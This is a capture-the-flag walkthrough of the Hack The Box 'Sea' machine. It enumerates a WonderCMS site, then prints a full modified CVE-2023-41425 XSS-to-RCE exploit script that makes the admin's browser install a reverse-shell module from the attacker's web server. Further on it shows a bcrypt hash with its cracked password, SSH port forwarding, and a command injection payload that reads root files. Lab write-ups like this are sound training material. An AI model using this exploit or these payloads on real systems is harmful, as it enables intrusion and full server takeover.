---
title: HTB-Sea
draft: false
tags:
---
![alt text](Sea.png)

## Rustscan

Rustscan discovers SSH and HTTP running on host. Typically HTB style Linux machine.

`rustscan --addresses 10.10.11.28 --range 1-65535`

![alt text](image.png)

## Enumeration
### HTTP - TCP 80

Let's get started with HTTP enumeration. 

The website seems to be about a company that organizes bike competitions:

![alt text](image-1.png)

`/how-to-participate` has `contact` marked blue, meaning hyper link:

![alt text](image-2.png)

Clicking on contact leads to `/contact.php`, but host name is not added to `/etc/hosts` file yet::

![alt text](image-3.png)

After adding sea.htb to  `/etc/hosts`, we can access `contact.php`:

![alt text](image-4.png)

`contact.php` is a registration page and user can send in information such as Name, email, and Website. 

### Feroxbuster

While eumerating `contact.php`, we will have feroxbuster enumerating subdisrecotries:

`feroxbuster -u http://sea.htb`

![alt text](image-5.png)

Feroxbuster went recursive and found bunch of interesting directories. Let's look at some of them.

`http://sea.htb/themes/bike/summary` provides information about the theme:

![alt text](image-6.png)

`http://sea.htb/themes/bike/LICENSE` is the default LICENSE page:

![alt text](image-7.png)

`http://sea.htb/themes/bike/version` shows the version of the CMS:

![alt text](image-8.png)

`sea.htb/themes/bike/README.md` reveals the CMS: WonderCMS bike theme

![alt text](image-9.png)

Now we know that WonderCMS bike theme 3.2.0 is running on the system.

## Exploitation
### CVE-2023-41425

Looking for known vulnerabilities regarding WonderCMS bike theme 3.2.0, **CVE-2023-41425** seems to be helpful:

![alt text](image-10.png)

Following [this github tutorial](https://gist.github.com/prodigiousMind/fc69a79629c4ba9ee88a7ad526043413), let's try to get a reverse shell:

![alt text](image-11.png)

Before executing the attack, don't forget to download the reverse shell from [here](https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip).


Let's slightly modify the exploit code so that it will download the reverse shell from our python web server as such:

```python
var urlRev = "http://sea.htb/wondercms/?installModule=http://10.10.14.63:8000/revshell-main.zip&directoryName=violet&type=themes&token=" + token;
```

Below is the full code after modification:

```python
# Author: prodigiousMind
# Exploit: Wondercms 4.3.2 XSS to RCE


import sys
import requests
import os
import bs4

if (len(sys.argv)<4): print("usage: python3 exploit.py loginURL IP_Address Port\nexample: python3 exploit.py http://localhost/wondercms/loginURL 192.168.29.165 5252")
else:
  data = '''
var url = "'''+str(sys.argv[1])+'''";
if (url.endsWith("/")) {
 url = url.slice(0, -1);
}
var urlWithoutLog = url.split("/").slice(0, -1).join("/");
var urlWithoutLogBase = new URL(urlWithoutLog).pathname; 
var token = document.querySelectorAll('[name="token"]')[0].value;
var urlRev = "http://sea.htb/wondercms/?installModule=http://10.10.14.63:8000/revshell-main.zip&directoryName=violet&type=themes&token=" + token;
var xhr3 = new XMLHttpRequest();
xhr3.withCredentials = true;
xhr3.open("GET", urlRev);
xhr3.send();
xhr3.onload = function() {
 if (xhr3.status == 200) {
   var xhr4 = new XMLHttpRequest();
   xhr4.withCredentials = true;
   xhr4.open("GET", urlWithoutLogBase+"/themes/revshell-main/rev.php");
   xhr4.send();
   xhr4.onload = function() {
     if (xhr4.status == 200) {
       var ip = "'''+str(sys.argv[2])+'''";
       var port = "'''+str(sys.argv[3])+'''";
       var xhr5 = new XMLHttpRequest();
       xhr5.withCredentials = true;
       xhr5.open("GET", urlWithoutLogBase+"/themes/revshell-main/rev.php?lhost=" + ip + "&lport=" + port);
       xhr5.send();
       
     }
   };
 }
};
'''
  try:
    open("xss.js","w").write(data)
    print("[+] xss.js is created")
    print("[+] execute the below command in another terminal\n\n----------------------------\nnc -lvp "+str(sys.argv[3]))
    print("----------------------------\n")
    XSSlink = str(sys.argv[1]).replace("loginURL","index.php?page=loginURL?")+"\"></form><script+src=\"http://"+str(sys.argv[2])+":8000/xss.js\"></script><form+action=\""
    XSSlink = XSSlink.strip(" ")
    print("send the below link to admin:\n\n----------------------------\n"+XSSlink)
    print("----------------------------\n")

    print("\nstarting HTTP server to allow the access to xss.js")
    os.system("python3 -m http.server\n")
  except: print(data,"\n","//write this to a file")
```

Now, run the exploit agaisnt the wondercms and let's have port 8001 set up as the reverse shell listener:

![alt text](image-13.png)

Copy the link created above and attach it the website form so that the admin can read it when the form is sent:

```
http://sea.htb/wondercms?page=index.php"></form><script+src="http://10.10.14.63:8000/xss.js"></script><form+action="
```

![alt text](image-14.png)

Visiting, `sea.htb/themes/revshell-main/rev.php?lhost=10.10.14.63&lport=8001`, we can trigger the reverse shell and we will have a reverse shell spawned as `www-data`:

![alt text](image-15.png)

## Privesc: www-data to amay

We will first make the shell more interactive using Python as such:

![alt text](image-16.png)


**lse.sh** finds some uncommon setuid binaries but it doesn't seem exploitable:

![alt text](image-17.png)

**linpeas** finds **database.js**:

![alt text](image-23.png)


**database.js** contains bcrypt encrypted password in it: `$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q`

![alt text](image-18.png)

### Hashcat

Before cracking it with hashcat, we will first remove all `\` so that the format matches hashcat: `$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q`

Cracking it with mode 3200, hash is cracked: `mychemicalromance`

`hashcat -m 3200 hash`

![alt text](sea-hc.png)

### SSH as amay

Using the cracked password, we can now ssh-in as `amay`:

`ssh amay@10.10.11.28`

![alt text](image-19.png)

## Privesc: amay to root

Port 8080 is running locally. Most likely a website:

![alt text](image-24.png)

### Port Forward

Let's forward port 8080 to attacker machine's port8888 using ssh:

`ssh -L 8888:localhost:8080 amay@sea.htb`

### Port 8080

Accessing `http://localhost:8888` through web browser, we can access internal system monitoring system:

![alt text](image-20.png)

Intercepting the traffic for `Analyze Log File`, it seems like it is actually reading from `/var/log/auth.log`, meaning there could be command injection vulnerability:

![alt text](image-22.png)

After several tries, injecting `/root/root.txt%3bkk%3a`, which decodes as `/root/root.txt;kk:`, could be used to read `root.txt`:

![alt text](image-21.png)

## References

- https://gist.github.com/prodigiousMind/fc69a79629c4ba9ee88a7ad526043413
- https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip